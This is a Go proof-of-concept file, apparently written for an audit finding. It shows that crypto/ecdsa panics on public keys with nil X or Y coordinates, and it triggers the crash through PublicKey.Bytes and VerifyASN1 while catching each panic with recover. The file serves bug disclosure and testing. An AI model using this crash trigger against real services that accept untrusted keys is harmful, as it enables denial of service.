// PoC for finding 028: Nil Coordinates Panic in crypto/ecdsa.
//
// pointFromAffine in src/crypto/ecdsa/ecdsa.go calls x.Sign() and y.Sign()
// without checking whether the *big.Int coordinates are nil. A caller-supplied
// ecdsa.PublicKey with a supported curve and nil X (or Y) reaches this helper
// through PublicKey.Bytes, ECDH, VerifyASN1, or signing conversion paths and
// crashes with a nil pointer dereference.
package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"fmt"
	"math/big"
)

func tryBytes(label string, pub *ecdsa.PublicKey) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("%s: PANIC AS EXPECTED: %v\n", label, r)
		}
	}()
	out, err := pub.Bytes()
	fmt.Printf("%s: no panic, err=%v out=%d bytes\n", label, err, len(out))
}

func tryVerify(label string, pub *ecdsa.PublicKey) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("%s: PANIC AS EXPECTED: %v\n", label, r)
		}
	}()
	// A syntactically valid empty SEQUENCE-of-INTEGER ASN.1 signature is enough
	// for the verify path to reach the affine -> FIPS conversion.
	sig := []byte{0x30, 0x06, 0x02, 0x01, 0x01, 0x02, 0x01, 0x01}
	ok := ecdsa.VerifyASN1(pub, []byte("hash"), sig)
	fmt.Printf("%s: no panic, verify=%v\n", label, ok)
}

func main() {
	curve := elliptic.P256()

	tryBytes("nil X", &ecdsa.PublicKey{Curve: curve, X: nil, Y: big.NewInt(1)})
	tryBytes("nil Y", &ecdsa.PublicKey{Curve: curve, X: big.NewInt(1), Y: nil})
	tryBytes("both nil", &ecdsa.PublicKey{Curve: curve, X: nil, Y: nil})
	tryVerify("VerifyASN1 nil X", &ecdsa.PublicKey{Curve: curve, X: nil, Y: big.NewInt(1)})
}
